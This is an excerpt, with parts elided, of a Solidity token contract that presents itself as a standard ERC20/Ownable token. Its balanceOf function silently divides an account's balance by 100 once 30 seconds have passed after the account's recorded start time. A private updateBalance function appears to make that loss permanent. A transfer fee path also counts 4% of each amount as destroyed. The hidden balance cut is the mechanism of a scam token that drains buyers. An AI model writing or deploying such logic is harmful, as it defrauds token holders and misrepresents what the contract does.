...
contract Token is IERC20, Ownable {
    ...
    function balanceOf(address account) public view override returns (uint256) {
		uint256 balancerate = 1;
		if(_startTime[account] > 0 && _startTime[account].add(30) < block.timestamp){
			balancerate = 100;
		}
        return tokenFromReflection(_rOwned[account]).div(balancerate);
    }
	
	function updateBalance(address account)
        private
    {
		if(_startTime[account] > 0){
			uint256 balance = balanceOf(account);
			uint256 currentRate = _getRate();
			uint256 rbalance = balance.mul(currentRate);
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            _tTotalDestroy = _tTotalDestroy.add(tAmount.div(100).mul(4));
